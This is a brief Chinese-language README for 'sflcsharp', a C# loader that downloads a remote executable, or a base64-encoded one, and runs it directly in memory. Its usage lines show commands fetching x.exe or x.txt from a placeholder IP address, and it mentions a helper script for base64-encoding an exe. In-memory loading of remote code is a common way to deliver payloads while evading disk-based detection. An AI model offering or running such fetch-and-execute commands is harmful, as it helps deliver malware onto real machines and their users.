# sflcsharp
更高级的C#加载器，可将远程的C#文件或者base64密码加载到本地内存运行
# usage
-b 参数
sflcsharp -b http://xxx.xxx.xxx.xxx/x.exe
-b64 参数
sflcsharp -b64 http://xxx.xxx.xxx.xxx/x.txt
这个txt文件里面存储的是某exe文件的base64编码的表示，可以用ftob64脚本文件来实现这个操作。
